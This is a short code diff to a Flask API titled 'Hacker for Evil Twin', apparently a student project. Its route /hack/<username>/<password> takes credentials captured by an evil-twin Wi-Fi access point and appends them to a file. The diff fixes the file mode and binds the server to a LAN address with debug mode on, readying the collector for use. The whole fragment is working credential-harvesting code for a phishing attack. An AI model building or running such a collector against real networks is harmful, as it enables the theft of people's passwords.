@@ -10,7 +10,7 @@ api = Api(app, title="Hacker", description="Hacker for Evil Twin. Zhou JIANG z51
 @api.route('/hack/<string:username>/<string:password>')
 class Hacker(Resource):
     def get(self, username, password):
-        with open('hack.txt', 'wa') as hack_file_w:
+        with open('hack.txt', 'a') as hack_file_w:
             print(f"Username: {username} Password: {password}", file=hack_file_w)
 
         print("Now the database has such values:")
@@ -24,4 +24,4 @@ class Hacker(Resource):
 
 
 if __name__ == "__main__":
-    app.run(host='127.0.0.1', port=9337, debug=True)
+    app.run(host='192.168.1.104', port=9337, debug=True)
